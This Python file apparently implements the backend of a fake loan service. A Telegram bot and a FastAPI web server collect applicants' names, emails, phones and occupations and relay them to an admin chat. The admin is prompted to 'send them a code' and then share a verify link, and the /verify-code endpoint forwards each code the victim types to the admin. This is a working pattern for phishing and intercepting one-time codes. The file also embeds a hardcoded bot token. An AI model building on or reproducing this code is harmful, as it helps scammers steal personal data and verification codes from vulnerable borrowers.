import os
import sqlite3
import threading
from datetime import datetime

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import JSONResponse, HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

# ======================
# CONFIG
# ======================
# Same bot token and admin (user) ID as before - unchanged.
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8647388636:AAG_Fhp1JMwHdoKH_hCyADrcaPuoRh4QtXI")
ADMIN_ID = os.environ.get("ADMIN_ID", "5887256773")

LOAN_LINK = "https://ecoloanstrustedagent.netlify.app/"
# TODO (CEO Hierarchy Labbs): confirm this once verify.html is uploaded to the same Netlify site.
# Netlify serves static files by their filename, so it should be /verify.html
# (not just /verify) unless you add a redirect rule.
VERIFY_LINK = "https://ecoloanstrustedagent.netlify.app/verify.html"

# ======================
# DATABASE
# ======================
conn = sqlite3.connect("loan_bot.db", check_same_thread=False)
cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS applications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id TEXT,
    name TEXT,
    email TEXT,
    phone TEXT,
    occupation TEXT,
    status TEXT,
    loan_usage TEXT,
    source TEXT DEFAULT 'telegram'
)
""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS website_leads (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    email TEXT,
    phone TEXT,
    amount TEXT,
    message TEXT,
    timestamp TEXT
)
""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS verifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    contact TEXT,
    code TEXT,
    timestamp TEXT
)
""")

try:
    cursor.execute("ALTER TABLE applications ADD COLUMN source TEXT DEFAULT 'telegram'")
except:
    pass

conn.commit()

# ======================
# FastAPI
# ======================
web_app = FastAPI()

web_app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@web_app.get("/")
async def serve_home():
    with open("index.html", "r") as f:
        return HTMLResponse(content=f.read())

@web_app.get("/verify")
async def serve_verify():
    with open("verify.html", "r") as f:
        return HTMLResponse(content=f.read())

@web_app.get("/health")
async def health():
    return JSONResponse({"status": "running"})

@web_app.post("/website-lead")
async def website_lead(request: Request):
    try:
        data = await request.json()
        name = data.get("name", "N/A")
        email = data.get("email", "N/A")
        phone = data.get("phone", "N/A")
        amount = data.get("amount", "Not specified")
        message = data.get("message", "No message")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        cursor.execute("""
            INSERT INTO website_leads (name, email, phone, amount, message, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (name, email, phone, amount, message, timestamp))
        conn.commit()

        admin_msg = (
            f"NEW WEBSITE LOAN APPLICATION\n\n"
            f"Name: {name}\n"
            f"Email: {email}\n"
            f"Phone: {phone}\n"
            f"Amount: {amount}\n"
            f"Usage: {message}\n"
            f"Time: {timestamp}\n\n"
            f"Send them a code then share the verify link:\n{VERIFY_LINK}"
        )
        await telegram_app.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)

        print(f"Website lead saved: {name}")
        return JSONResponse({
            "status": "success",
            "message": f"Thank you {name}! Please check your email or phone for a verification code, then use the link we will send you to complete your application."
        })
    except Exception as e:
        print("Website error:", e)
        raise HTTPException(status_code=400, detail="Error")

@web_app.post("/verify-code")
async def verify_code(request: Request):
    try:
        data = await request.json()
        contact = data.get("contact", "N/A")
        code = data.get("code", "N/A")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        cursor.execute("""
            INSERT INTO verifications (contact, code, timestamp)
            VALUES (?, ?, ?)
        """, (contact, code, timestamp))
        conn.commit()

        admin_msg = (
            f"VERIFICATION CODE RECEIVED\n\n"
            f"Contact: {contact}\n"
            f"Code entered: {code}\n"
            f"Time: {timestamp}"
        )
        await telegram_app.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
        print(f"Verification received from: {contact}")
        return JSONResponse({"status": "success"})
    except Exception as e:
        print("Verify error:", e)
        raise HTTPException(status_code=400, detail="Error")

# ======================
# TELEGRAM BOT
# ======================
NAME, EMAIL, PHONE, OCCUPATION, STATUS, LOAN_USAGE = range(6)
telegram_app = None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Welcome to EcoLoan Assistant!\n\nUse /loan to start your application."
    )

async def loan_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Enter your Full Name:")
    return NAME

async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["name"] = update.message.text
    await update.message.reply_text("Enter your Email:")
    return EMAIL

async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["email"] = update.message.text
    await update.message.reply_text("Enter your Phone Number:")
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["phone"] = update.message.text
    await update.message.reply_text("Enter your Occupation:")
    return OCCUPATION

async def get_occupation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["occupation"] = update.message.text
    await update.message.reply_text("Status? (Employed / Self Employed / Student / Unemployed)")
    return STATUS

async def get_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["status"] = update.message.text
    await update.message.reply_text("What will you use the loan for?")
    return LOAN_USAGE

async def get_loan_usage(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["loan_usage"] = update.message.text
    user = update.effective_user
    user_id = str(user.id)

    cursor.execute("""
    INSERT INTO applications (user_id, name, email, phone, occupation, status, loan_usage, source)
    VALUES (?, ?, ?, ?, ?, ?, ?, 'telegram')
    """, (
        user_id,
        context.user_data.get("name"),
        context.user_data.get("email"),
        context.user_data.get("phone"),
        context.user_data.get("occupation"),
        context.user_data.get("status"),
        context.user_data.get("loan_usage"),
    ))
    conn.commit()

    admin_msg = (
        f"NEW TELEGRAM APPLICATION\n\n"
        f"Name: {context.user_data.get('name')}\n"
        f"Email: {context.user_data.get('email')}\n"
        f"Phone: {context.user_data.get('phone')}\n"
        f"Occupation: {context.user_data.get('occupation')}\n"
        f"Status: {context.user_data.get('status')}\n"
        f"Usage: {context.user_data.get('loan_usage')}"
    )
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)

    await update.message.reply_text(
        f"Application Submitted Successfully!\n\n"
        f"Continue Here:\n{LOAN_LINK}\n\n"
        f"Our team will contact you shortly."
    )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Application Cancelled.")
    return ConversationHandler.END

# ======================
# RUN BOT IN BACKGROUND
# ======================
def run_bot():
    import asyncio
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def start_bot():
        global telegram_app
        telegram_app = Application.builder().token(BOT_TOKEN).build()

        loan_handler = ConversationHandler(
            entry_points=[CommandHandler("loan", loan_start)],
            states={
                NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_name)],
                EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_email)],
                PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
                OCCUPATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_occupation)],
                STATUS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_status)],
                LOAN_USAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_loan_usage)],
            },
            fallbacks=[CommandHandler("cancel", cancel)],
        )

        telegram_app.add_handler(CommandHandler("start", start))
        telegram_app.add_handler(loan_handler)

        await telegram_app.initialize()
        await telegram_app.start()
        await telegram_app.updater.start_polling(drop_pending_updates=True)
        print("EcoLoan Bot is polling...")
        await asyncio.Event().wait()

    loop.run_until_complete(start_bot())

# ======================
# MAIN
# ======================
if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    port = int(os.environ.get("PORT", 8000))
    print(f"Starting web server on port {port}")
    uvicorn.run(web_app, host="0.0.0.0", port=port)
